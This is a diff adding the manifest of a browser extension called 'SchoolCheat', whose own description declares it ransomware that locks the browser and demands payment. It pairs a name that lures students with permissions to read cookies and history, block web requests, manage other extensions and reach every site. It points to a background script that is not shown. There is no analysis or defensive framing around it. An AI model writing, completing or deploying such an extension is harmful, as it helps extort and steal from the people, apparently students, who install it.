@@ -1,0 +1,25 @@
+{
+  "manifest_version": 3,
+  "name": "SchoolCheat",
+  "version": "1.0",
+  "description": "A ransomware extension that locks the browser and demands payment.",
+  "permissions": [
+    "cookies",
+    "webRequest",
+    "webRequestBlocking",
+    "tabs",
+    "storage",
+    "activeTab",
+    "management",
+    "history"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "action": {
+    "default_popup": "index.html"
+  },
+  "host_permissions": [
+    "<all_urls>"
+  ]
+}
